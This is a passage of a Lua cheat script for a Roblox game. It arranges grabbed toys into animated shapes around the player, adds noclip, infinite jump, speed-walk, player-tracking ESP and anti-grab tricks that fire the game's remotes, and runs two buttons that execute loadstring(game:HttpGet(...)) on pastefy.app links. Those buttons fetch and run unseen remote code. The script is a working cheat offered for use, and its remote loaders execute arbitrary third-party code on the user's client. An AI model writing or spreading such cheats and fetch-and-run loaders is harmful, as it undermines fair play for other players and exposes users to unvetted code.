                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.VerticalBigHeartConfig.Enabled = false
                return
            end
            local count = math.min(#SH.verticalBigHeartToys, SH.VerticalBigHeartConfig.ObjectCount)
            SH.verticalBigHeartPoints = {}
            for i = 1, count do
                local part = Instance.new("Part")
                part.CanCollide = false; part.Anchored = true; part.Transparency = 1
                part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
                SH.verticalBigHeartPoints[i] = { angle = (i - 1) * (2 * math.pi / count), part = part, assignedToy = nil }
            end
            SH.verticalBigHeartAssignedToys = {}
            for i = 1, math.min(#SH.verticalBigHeartToys, #SH.verticalBigHeartPoints) do
                local toy = SH.verticalBigHeartToys[i]
                if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                    local primaryPart = getPrimaryPart(toy)
                    if primaryPart then
                        for _, child in ipairs(toy:GetChildren()) do if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end end
                        local BG, BP = attachPhysics(primaryPart)
                        local toyTable = { BG = BG, BP = BP, Pallet = primaryPart, Model = toy, PointIndex = i, baseAngle = SH.verticalBigHeartPoints[i].angle }
                        SH.verticalBigHeartPoints[i].assignedToy = toyTable
                        table.insert(SH.verticalBigHeartAssignedToys, toyTable)
                    end
                end
            end
            SH.verticalBigHeartTime = 0
            if SH.verticalBigHeartLoopConn then SH.verticalBigHeartLoopConn:Disconnect() end
            SH.verticalBigHeartLoopConn = RunService.RenderStepped:Connect(function(dt)
                if not SH.VerticalBigHeartConfig.Enabled or not LocalPlayer.Character then return end
                local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
                if not torso then return end
                SH.verticalBigHeartTime = SH.verticalBigHeartTime + dt
                local basePosition = SH.VerticalBigHeartConfig.FollowPlayer and torso.Position or torso.Position
                local pulseEffect = (SH.VerticalBigHeartConfig.PulseSpeed > 0) and math.sin(SH.verticalBigHeartTime * SH.VerticalBigHeartConfig.PulseSpeed) * SH.VerticalBigHeartConfig.PulseAmplitude or 0
                for _, point in ipairs(SH.verticalBigHeartPoints) do
                    if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                        local toy = point.assignedToy
                        local currentAngle = toy.baseAngle + (SH.verticalBigHeartTime * SH.VerticalBigHeartConfig.RotationSpeed)
                        local baseScale = SH.VerticalBigHeartConfig.Size / 20
                        local x = 16 * (math.sin(currentAngle) ^ 3) * baseScale * SH.VerticalBigHeartConfig.HeartScale
                        local y = (13 * math.cos(currentAngle) - 5 * math.cos(2*currentAngle) - 2 * math.cos(3*currentAngle) - math.cos(4*currentAngle)) * baseScale * SH.VerticalBigHeartConfig.HeartScale
                        if pulseEffect > 0 then local pf = 1 + (pulseEffect * 0.1); x = x * pf; y = y * pf end
                        local targetPosition = basePosition + Vector3.new(x, SH.VerticalBigHeartConfig.Height + y, 0)
                        if point.part then point.part.Position = targetPosition end
                        toy.BP.Position = targetPosition
                        toy.BG.CFrame = CFrame.new(targetPosition) * CFrame.Angles(0, 0, 0)
                    end
                end
            end)
            OrionLib:MakeNotification({ Name = "Vertical Big Heart Start", Content = "Size: " .. SH.VerticalBigHeartConfig.Size, Time = 3 })
        else
            if SH.verticalBigHeartLoopConn then SH.verticalBigHeartLoopConn:Disconnect(); SH.verticalBigHeartLoopConn = nil end
            for _, point in ipairs(SH.verticalBigHeartPoints) do
                if point.part then point.part:Destroy() end
                if point.assignedToy then
                    if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                    if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
                end
            end
            SH.verticalBigHeartPoints = {}; SH.verticalBigHeartAssignedToys = {}
            OrionLib:MakeNotification({ Name = "Vertical Big Heart Stop", Content = "Vertical big heart arrangement cleared", Time = 2 })
        end
    end
    _G.toggleVerticalBigHeart = toggleVerticalBigHeart
end

-- ============================================================================
-- Block 27: SuperRing (Tornado Toy MOD) Feature
-- ============================================================================
do
    local SH = _G.SH
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local OrionLib = _G.OrionLib
    local findObjects = _G.findObjects
    local getPrimaryPart = _G.getPrimaryPart

    local function createSuperRingPoints(count)
        local points = {}
        if count == 0 then return points end
        for i = 1, count do
            local angle = (i - 1) * (2 * math.pi / count)
            local part = Instance.new("Part")
            part.CanCollide = false; part.Anchored = true; part.Transparency = 1
            part.Size = Vector3.new(4, 1, 4); part.Parent = workspace
            points[i] = {
                angle = angle,
                part = part,
                assignedToy = nil,
                heightOffset = (i - 1) * (SH.SuperRingConfig.Height / count),
            }
        end
        return points
    end

    local function getSuperRingPosition(angle, radius, heightOffset, time, rotationSpeed, spiralSpeed, waveSpeed, waveAmplitude, tornadoEffect)
        local rotationAngle = angle + (time * rotationSpeed)
        local x = math.cos(rotationAngle) * radius
        local z = math.sin(rotationAngle) * radius
        local spiralOffset = 0
        if spiralSpeed > 0 then spiralOffset = math.sin(time * spiralSpeed + angle) * 0.5 end
        local waveOffset = 0
        if waveSpeed > 0 then waveOffset = math.sin(time * waveSpeed + angle * 2) * waveAmplitude end
        local currentRadius = radius
        if tornadoEffect then
            local heightFactor = 1 - (heightOffset / SH.SuperRingConfig.Height) * 0.5
            currentRadius = radius * heightFactor
            x = math.cos(rotationAngle) * currentRadius
            z = math.sin(rotationAngle) * currentRadius
        end
        local finalHeight = SH.SuperRingConfig.BaseHeight + heightOffset + spiralOffset + waveOffset
        return x, z, finalHeight, currentRadius
    end

    local function attachSuperRingPhysics(part)
        if not part then return nil, nil end
        local existingBG = part:FindFirstChildOfClass("BodyGyro")
        local existingBP = part:FindFirstChildOfClass("BodyPosition")
        if existingBG and existingBP then return existingBG, existingBP end
        if existingBG then existingBG:Destroy() end
        if existingBP then existingBP:Destroy() end
        local BP = Instance.new("BodyPosition")
        local BG = Instance.new("BodyGyro")
        BP.P = 15000; BP.D = 200; BP.MaxForce = Vector3.new(1, 1, 1) * 1e10; BP.Parent = part
        BG.P = 15000; BG.D = 200; BG.MaxTorque = Vector3.new(1, 1, 1) * 1e10; BG.Parent = part
        return BG, BP
    end

    local function assignSuperRingToysToPoints()
        SH.superRingAssignedToys = {}
        for i = 1, math.min(#SH.superRingToys, #SH.superRingPoints) do
            local toy = SH.superRingToys[i]
            if toy and toy:IsA("Model") and toy.Name == SH.ObjectIDConfig.CurrentObjectID then
                local primaryPart = getPrimaryPart(toy)
                if primaryPart then
                    for _, child in ipairs(toy:GetChildren()) do
                        if child:IsA("BasePart") then child.CanCollide = false; child.CanTouch = false; child.Anchored = false end
                    end
                    local BG, BP = attachSuperRingPhysics(primaryPart)
                    local toyTable = {
                        BG = BG, BP = BP, Pallet = primaryPart, Model = toy,
                        PointIndex = i,
                        baseAngle = SH.superRingPoints[i].angle,
                        baseHeightOffset = SH.superRingPoints[i].heightOffset,
                    }
                    SH.superRingPoints[i].assignedToy = toyTable
                    table.insert(SH.superRingAssignedToys, toyTable)
                end
            end
        end
        return SH.superRingAssignedToys
    end

    local function startSuperRingLoop()
        if SH.superRingLoopConn then SH.superRingLoopConn:Disconnect(); SH.superRingLoopConn = nil end
        SH.superRingTime = 0
        SH.superRingLoopConn = RunService.RenderStepped:Connect(function(dt)
            if not SH.SuperRingConfig.Enabled or not LocalPlayer.Character then return end
            local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local torso = LocalPlayer.Character:FindFirstChild("Torso") or LocalPlayer.Character:FindFirstChild("UpperTorso")
            if not hrp or not torso then return end
            SH.superRingTime = SH.superRingTime + dt
            local basePosition = torso.Position
            for i, point in ipairs(SH.superRingPoints) do
                if point.assignedToy and point.assignedToy.BP and point.assignedToy.BG then
                    local toy = point.assignedToy
                    local currentAngle = toy.baseAngle + (SH.superRingTime * SH.SuperRingConfig.RotationSpeed * 0.5)
                    local x, z, height, radius = getSuperRingPosition(
                        currentAngle, SH.SuperRingConfig.Radius, toy.baseHeightOffset,
                        SH.superRingTime, SH.SuperRingConfig.RotationSpeed, SH.SuperRingConfig.SpiralSpeed,
                        SH.SuperRingConfig.WaveSpeed, SH.SuperRingConfig.WaveAmplitude, SH.SuperRingConfig.TornadoEffect
                    )
                    local localPos = Vector3.new(x, height, z)
                    local targetPosition = basePosition + localPos
                    if point.part then point.part.Position = targetPosition end
                    toy.BP.Position = targetPosition
                    if SH.SuperRingConfig.TornadoEffect then
                        local direction = (targetPosition - basePosition).Unit
                        if direction.Magnitude > 0 then
                            toy.BG.CFrame = CFrame.lookAt(targetPosition, targetPosition + direction)
                        end
                    else
                        toy.BG.CFrame = CFrame.new(targetPosition) * CFrame.Angles(-math.rad(90), 0, 0)
                    end
                end
            end
        end)
    end

    local function stopSuperRingLoop()
        if SH.superRingLoopConn then SH.superRingLoopConn:Disconnect(); SH.superRingLoopConn = nil end
        for _, point in ipairs(SH.superRingPoints) do
            if point.part then point.part:Destroy() end
            if point.assignedToy then
                if point.assignedToy.BG then point.assignedToy.BG:Destroy() end
                if point.assignedToy.BP then point.assignedToy.BP:Destroy() end
            end
        end
        SH.superRingPoints = {}
        SH.superRingAssignedToys = {}
    end

    function toggleSuperRing(state)
        SH.SuperRingConfig.Enabled = state
        if state then
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            SH.superRingToys = findObjects()
            if #SH.superRingToys == 0 then
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "Error", Content = "No objects found", Time = 3 })
                SH.SuperRingConfig.Enabled = false
                return
            end
            SH.superRingPoints = createSuperRingPoints(math.min(#SH.superRingToys, SH.SuperRingConfig.ObjectCount))
            assignSuperRingToysToPoints()
            startSuperRingLoop()
            OrionLib:MakeNotification({
                Name = "Tornado Toy MOD Started",
                Content = "Radius: " .. SH.SuperRingConfig.Radius .. " / Height: " .. SH.SuperRingConfig.Height .. " / Count: " .. SH.SuperRingConfig.ObjectCount,
                Image = "rbxassetid://4483362458",
                Time = 3
            })
        else
            stopSuperRingLoop()
            OrionLib:MakeNotification({
                Name = "Tornado Toy MOD Stopped",
                Content = "Super ring arrangement cleared",
                Image = "rbxassetid://4483362458",
                Time = 2
            })
        end
    end
    _G.toggleSuperRing = toggleSuperRing
end

-- ============================================================================
-- Block 28: Me(=^・^=) Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local Camera = _G.Camera
    local RunService = _G.RunService
    local UserInputService = _G.UserInputService
    local Players = _G.Players
    local Theme = _G.Theme
    local SH = _G.SH

    local MITab = Window:MakeTab({ Name = "Me(=^・^=)", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    MITab:AddSection({ Name = "Movement Features" })

    local UtilityConfig = {
        InfiniteJump = false, Noclip = false, TPWalk = false, TPWalkSpeed = 50,
        ESP = false, FOV = 70, OriginalFOV = 70, ThirdPerson = false
    }

    local NoclipConnection = nil
    local OriginalCollision = {}
    local TPWalkConnection = nil
    local OriginalWalkSpeed = 16
    local ESPConnection = nil
    local ESPLabels = {}

    local function toggleInfiniteJump(state)
        UtilityConfig.InfiniteJump = state
        if state then
            PlayActionSound()
            UserInputService.JumpRequest:Connect(function()
                if UtilityConfig.InfiniteJump and LocalPlayer.Character then
                    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then humanoid:ChangeState("Jumping") end
                end
            end)
        end
        OrionLib:MakeNotification({ Name = "Infinite Jump", Content = state and "Enabled" or "Disabled", Time = 2 })
    end

    local function enableNoclip()
        if NoclipConnection then NoclipConnection:Disconnect(); NoclipConnection = nil end
        OriginalCollision = {}
        if LocalPlayer.Character then
            for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then OriginalCollision[part] = part.CanCollide end
            end
        end
        NoclipConnection = RunService.Stepped:Connect(function()
            if UtilityConfig.Noclip and LocalPlayer.Character then
                for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end)
    end

    local function disableNoclip()
        if NoclipConnection then NoclipConnection:Disconnect(); NoclipConnection = nil end
        if LocalPlayer.Character then
            for part, canCollide in pairs(OriginalCollision) do
                if part and part.Parent then part.CanCollide = canCollide end
            end
            OriginalCollision = {}
        end
    end

    local function toggleNoclip(state)
        UtilityConfig.Noclip = state
        if state then PlayActionSound(); enableNoclip() else disableNoclip() end
        OrionLib:MakeNotification({ Name = "Noclip", Content = state and "Enabled" or "Disabled", Time = 2 })
    end

    local function enableTPWalk()
        if TPWalkConnection then TPWalkConnection:Disconnect(); TPWalkConnection = nil end
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then OriginalWalkSpeed = humanoid.WalkSpeed end
        end
        TPWalkConnection = RunService.RenderStepped:Connect(function(dt)
            if not UtilityConfig.TPWalk or not LocalPlayer.Character then return end
            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoid and humanoidRootPart then
                humanoid.WalkSpeed = UtilityConfig.TPWalkSpeed
                local moveDirection = Vector3.new(0, 0, 0)
                local moveVector = humanoid.MoveDirection
                if moveVector.Magnitude > 0 then
                    moveDirection = moveVector
                else
                    if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDirection = moveDirection + humanoidRootPart.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDirection = moveDirection - humanoidRootPart.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDirection = moveDirection - humanoidRootPart.CFrame.RightVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDirection = moveDirection + humanoidRootPart.CFrame.RightVector end
                end
                if moveDirection.Magnitude > 0 then
                    moveDirection = moveDirection.Unit
                    humanoidRootPart.Velocity = Vector3.new(moveDirection.X * UtilityConfig.TPWalkSpeed, humanoidRootPart.Velocity.Y, moveDirection.Z * UtilityConfig.TPWalkSpeed)
                else
                    humanoidRootPart.Velocity = Vector3.new(0, humanoidRootPart.Velocity.Y, 0)
                end
            end
        end)
    end

    local function disableTPWalk()
        if TPWalkConnection then TPWalkConnection:Disconnect(); TPWalkConnection = nil end
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid.WalkSpeed = OriginalWalkSpeed end
        end
    end

    local function toggleTPWalk(state)
        UtilityConfig.TPWalk = state
        if state then PlayActionSound(); enableTPWalk() else disableTPWalk() end
        OrionLib:MakeNotification({ Name = "TPWalk", Content = state and "Enabled" or "Disabled", Time = 2 })
    end

    local function enableESP()
        if ESPConnection then ESPConnection:Disconnect(); ESPConnection = nil end
        for _, label in pairs(ESPLabels) do if label then label:Destroy() end end
        ESPLabels = {}
        ESPConnection = RunService.RenderStepped:Connect(function()
            if not UtilityConfig.ESP then return end
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        if not ESPLabels[player] then
                            local label = Instance.new("BillboardGui")
                            label.Name = "ESP_" .. player.Name
                            label.Adornee = humanoidRootPart
                            label.AlwaysOnTop = true
                            label.Size = UDim2.new(0, 200, 0, 50)
                            label.StudsOffset = Vector3.new(0, 3, 0)
                            local textLabel = Instance.new("TextLabel")
                            textLabel.Size = UDim2.new(1, 0, 1, 0)
                            textLabel.BackgroundTransparency = 1
                            textLabel.Text = player.Name
                            textLabel.TextColor3 = Color3.new(1, 1, 1)
                            textLabel.TextStrokeTransparency = 0
                            textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
                            textLabel.Font = Enum.Font.SourceSansBold
                            textLabel.TextSize = 20
                            textLabel.Parent = label
                            label.Parent = humanoidRootPart
                            ESPLabels[player] = label
                        end
                        local distance = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) and (humanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude or 0
                        local label = ESPLabels[player]
                        if label and label:FindFirstChildOfClass("TextLabel") then
                            label:FindFirstChildOfClass("TextLabel").Text = string.format("%s\n[%.1f studs]", player.Name, distance)
                        end
                    end
                end
            end
            for player, label in pairs(ESPLabels) do
                if not Players:FindFirstChild(player.Name) then
                    label:Destroy()
                    ESPLabels[player] = nil
                end
            end
        end)
    end

    local function disableESP()
        if ESPConnection then ESPConnection:Disconnect(); ESPConnection = nil end
        for _, label in pairs(ESPLabels) do if label then label:Destroy() end end
        ESPLabels = {}
    end

    local function toggleESP(state)
        UtilityConfig.ESP = state
        if state then PlayActionSound(); enableESP() else disableESP() end
        OrionLib:MakeNotification({ Name = "ESP", Content = state and "Enabled" or "Disabled", Time = 2 })
    end

    local function toggleThirdPerson(state)
        UtilityConfig.ThirdPerson = state
        if state then
            PlayActionSound()
            LocalPlayer.CameraMode = Enum.CameraMode.Classic
            LocalPlayer.CameraMaxZoomDistance = 100
            LocalPlayer.CameraMinZoomDistance = 0.5
        else
            LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
            LocalPlayer.CameraMaxZoomDistance = 0.5
            LocalPlayer.CameraMinZoomDistance = 0.5
        end
    end

    MITab:AddToggle({ Name = "Infinite Jump", Default = false, Callback = toggleInfiniteJump })
    MITab:AddToggle({ Name = "Noclip", Default = false, Callback = toggleNoclip })
    MITab:AddToggle({ Name = "TPWalk", Default = false, Callback = toggleTPWalk })
    MITab:AddSlider({ Name = "TPWalk Speed", Min = 16, Max = 500, Default = UtilityConfig.TPWalkSpeed, Color = Theme.SliderColor, Increment = 5, ValueName = "Speed", Callback = function(v) UtilityConfig.TPWalkSpeed = v end })

    MITab:AddSection({ Name = "Visual Features" })
    MITab:AddToggle({ Name = "ESP", Default = false, Callback = toggleESP })
    MITab:AddToggle({ Name = "Third Person View", Default = false, Callback = toggleThirdPerson })
    MITab:AddSlider({ Name = "FOV", Min = -5, Max = 180, Default = UtilityConfig.FOV, Color = Theme.SliderColor, Increment = 1, ValueName = "deg", Callback = function(v)
        UtilityConfig.FOV = v
        if Camera then Camera.FieldOfView = v end
    end })
    MITab:AddButton({ Name = "Reset FOV", Callback = function()
        PlayActionSound()
        if Camera then
            Camera.FieldOfView = UtilityConfig.OriginalFOV
            UtilityConfig.FOV = UtilityConfig.OriginalFOV
        end
    end })

    MITab:AddSection({ Name = "Control" })
    MITab:AddButton({
        Name = "Stop All Features",
        Callback = function()
            PlayActionSound()
            if SH.FeatherConfig.Enabled then _G.toggleFeather(false) end
            if SH.MagicCircleConfig.Enabled then _G.toggleMagicCircle(false) end
            if SH.HeartConfig.Enabled then _G.toggleHeart(false) end
            if SH.BigHeartConfig.Enabled then _G.toggleBigHeart(false) end
            if SH.StarOfDavidConfig.Enabled then _G.toggleStarOfDavid(false) end
            if SH.StarConfig.Enabled then _G.toggleStar(false) end
            if SH.Star2Config.Enabled then _G.toggleStar2(false) end
            if SH.SphereConfig.Enabled then _G.toggleSphere(false) end
            if SH.FerrisWheelConfig.Enabled then _G.toggleFerrisWheel(false) end
            if SH.AnimN1Config.Enabled then _G.toggleAnimN1(false) end
            if SH.AnimN2Config.Enabled then _G.toggleAnimN2(false) end
            if SH.AnimN3Config.Enabled then _G.toggleAnimN3(false) end
            if SH.WingConfig.Enabled then _G.toggleWing(false) end
            if SH.SaturnConfig.Enabled then _G.toggleSaturn(false) end
            if SH.PianoConfig.Enabled then _G.togglePiano(false) end
            if SH.VerticalHeartConfig.Enabled then _G.toggleVerticalHeart(false) end
            if SH.VerticalBigHeartConfig.Enabled then _G.toggleVerticalBigHeart(false) end
            if SH.SuperRingConfig.Enabled then _G.toggleSuperRing(false) end
            if UtilityConfig.TPWalk then toggleTPWalk(false) end
            if UtilityConfig.Noclip then toggleNoclip(false) end
            if UtilityConfig.ESP then toggleESP(false) end
            if Camera then
                Camera.FieldOfView = UtilityConfig.OriginalFOV
                UtilityConfig.FOV = UtilityConfig.OriginalFOV
            end
            OrionLib:MakeNotification({ Name = "Stop All Features", Content = "All features have been stopped", Time = 3 })
        end
    })
end

-- ============================================================================
-- Block 29: GUI Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local Camera = _G.Camera
    local RunService = _G.RunService
    local UserInputService = _G.UserInputService

    local GUITab = Window:MakeTab({ Name = "GUI", Icon = "rbxassetid://4483362458", PremiumOnly = false })
    
    GUITab:AddSection({ Name = "Fix GUI" })
    GUITab:AddButton({
        Name = "Fix GUI",
        Callback = function()
            PlayActionSound()
            local Player = LocalPlayer
            local Camera = Camera
            local RunService = RunService
            local UserInputService = UserInputService

            local targetPart = nil
            local fixedPart = nil

            local highlight = Instance.new("Highlight")
            highlight.FillTransparency = 0.5
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)

            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.Name = "MobileFixerUI"
            ScreenGui.ResetOnSpawn = false
            ScreenGui.Parent = game:GetService("CoreGui")

            local MainFrame = Instance.new("Frame")
            MainFrame.Size = UDim2.new(0, 180, 0, 160)
            MainFrame.Position = UDim2.new(0.7, 0, 0.4, 0)
            MainFrame.BackgroundTransparency = 1
            MainFrame.Parent = ScreenGui
            MainFrame.Visible = false

            local ToggleButton = Instance.new("TextButton")
            ToggleButton.Size = UDim2.new(0, 80, 0, 40)
            ToggleButton.Position = UDim2.new(0.05, 0, 0.4, 0)
            ToggleButton.Text = "MENU"
            ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleButton.Font = Enum.Font.GothamBold
            ToggleButton.Parent = ScreenGui
            local CornerT = Instance.new("UICorner")
            CornerT.Parent = ToggleButton

            local FixButton = Instance.new("TextButton")
            FixButton.Size = UDim2.new(1, 0, 0.45, 0)
            FixButton.Position = UDim2.new(0, 0, 0, 0)
            FixButton.Text = "Fix Held Object"
            FixButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
            FixButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            FixButton.Font = Enum.Font.GothamBold
            FixButton.Parent = MainFrame
            local Corner1 = Instance.new("UICorner")
            Corner1.Parent = FixButton

            local UnfixButton = Instance.new("TextButton")
            UnfixButton.Size = UDim2.new(1, 0, 0.45, 0)
            UnfixButton.Position = UDim2.new(0, 0, 0.55, 0)
            UnfixButton.Text = "Unfix"
            UnfixButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
            UnfixButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            UnfixButton.Font = Enum.Font.GothamBold
            UnfixButton.Parent = MainFrame
            local Corner2 = Instance.new("UICorner")
            Corner2.Parent = UnfixButton

            ToggleButton.MouseButton1Click:Connect(function()
                MainFrame.Visible = not MainFrame.Visible
                if MainFrame.Visible then
                    ToggleButton.Text = "CLOSE"
                    ToggleButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
                else
                    ToggleButton.Text = "MENU"
                    ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                end
            end)

            local dragging, dragStart, startPos
            MainFrame.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                    dragStart = input.Position
                    startPos = MainFrame.Position
                end
            end)

            UserInputService.InputChanged:Connect(function(input)
                if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                    local delta = input.Position - dragStart
                    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                end
            end)

            UserInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = false
                end
            end)

            RunService.RenderStepped:Connect(function()
                local viewportCenter = Camera.ViewportSize / 2
                local unitRay = Camera:ViewportPointToRay(viewportCenter.X, viewportCenter.Y)
                local raycastParams = RaycastParams.new()
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                raycastParams.FilterDescendantsInstances = {Player.Character}
                local result = workspace:Raycast(unitRay.Origin, unitRay.Direction * 500, raycastParams)
                if result and result.Instance:IsA("BasePart") then
                    local obj = result.Instance
                    if obj.Size.X < 100 and obj.Size.Z < 100 and obj ~= fixedPart then
                        targetPart = obj
                        highlight.Adornee = targetPart
                        highlight.Parent = targetPart
                        highlight.FillColor = (targetPart.Anchored) and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(255, 255, 0)
                    end
                else
                    if not fixedPart then
                        highlight.Parent = nil
                        targetPart = nil
                    end
                end
            end)

            FixButton.MouseButton1Click:Connect(function()
                if targetPart then
                    targetPart.Anchored = true
                    fixedPart = targetPart
                    highlight.FillColor = Color3.fromRGB(0, 255, 255)
                end
            end)

            UnfixButton.MouseButton1Click:Connect(function()
                if fixedPart then
                    fixedPart.Anchored = false
                    fixedPart = nil
                    highlight.Parent = nil
                    targetPart = nil
                end
            end)

            OrionLib:MakeNotification({ Name = "Fix GUI", Content = "Started (Press MENU button to show)", Time = 3 })
        end
    })

    GUITab:AddSection({ Name = "TP GUI" })
    GUITab:AddButton({
        Name = "TTP GUI",
        Callback = function()
            PlayActionSound()
            loadstring(game:HttpGet("https://pastefy.app/h6uDbIIz/raw"))()
            OrionLib:MakeNotification({ Name = "TTP GUI", Content = "Loaded! \\ key for TP / Fix feature included", Time = 3 })
        end
    })

    GUITab:AddSection({ Name = "Keyboard GUI" })
    GUITab:AddButton({
        Name = "SaluraHUB-keyboard.GUI",
        Callback = function()
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://pastefy.app/PWUVVdb3/raw"))()
            end)
            if success then
                PlayActionSound()
                OrionLib:MakeNotification({ Name = "SaluraHUB-keyboard.GUI", Content = "Loaded successfully!", Time = 3 })
            else
                PlayErrorSound()
                OrionLib:MakeNotification({ Name = "SaluraHUB-keyboard.GUI", Content = "Load failed: " .. tostring(err), Time = 5 })
            end
        end
    })
end

-- ============================================================================
-- Block 30: Anti Tab
-- ============================================================================
do
    local Window = _G.Window
    local OrionLib = _G.OrionLib
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local ReplicatedStorage = _G.ReplicatedStorage
    local Players = _G.Players
    local Workspace = _G.Workspace

    local AntiTab = Window:MakeTab({ Name = "Anti", Icon = "rbxassetid://4483362458", PremiumOnly = false })

    local RS = ReplicatedStorage
    local GE = RS:FindFirstChild("GrabEvents") or RS:WaitForChild("GrabEvents", 5)
    local SetNetworkOwner = GE and GE:FindFirstChild("SetNetworkOwner")
    local DestroyGrabLine = GE and GE:FindFirstChild("DestroyGrabLine")
    local StruggleEvent = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("Struggle")
    local RagdollRemote = RS:FindFirstChild("CharacterEvents") and RS.CharacterEvents:FindFirstChild("RagdollRemote")
    local SpawnToyRemote = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    local DestroyToy = RS:FindFirstChild("MenuToys") and RS.MenuToys:FindFirstChild("DestroyToy")
    local isHeldValue = LocalPlayer:FindFirstChild("IsHeld") or LocalPlayer:WaitForChild("IsHeld", 5)

    AntiTab:AddSection({ Name = "Defense Features" })

    local AntiGrabEnabled = false
    AntiTab:AddToggle({
        Name = "Escape When Grabbed (Simple)",
        Default = false,
        Callback = function(Value)
            AntiGrabEnabled = Value
            if Value then PlayActionSound() end
        end
    })

    RunService.Heartbeat:Connect(function()
        if not AntiGrabEnabled then return end
        local character = LocalPlayer.Character
        if not character then return end
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then return end
        if isHeldValue and isHeldValue.Value == true then
            pcall(function()
                if StruggleEvent then StruggleEvent:FireServer(LocalPlayer) end
            end)
            humanoidRootPart.Velocity = Vector3.new()
            humanoidRootPart.Anchored = true
        else
            humanoidRootPart.Anchored = false
        end
    end)

    local antiGrabV2Enabled = false
    local heldConnectionV2 = nil

    local function StopAntiGrabV2()
        antiGrabV2Enabled = false
        if heldConnectionV2 then heldConnectionV2:Disconnect() heldConnectionV2 = nil end
        local Root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if Root then Root.Anchored = false end
    end

    local function StartAntiGrabV2()
        if heldConnectionV2 then heldConnectionV2:Disconnect() end
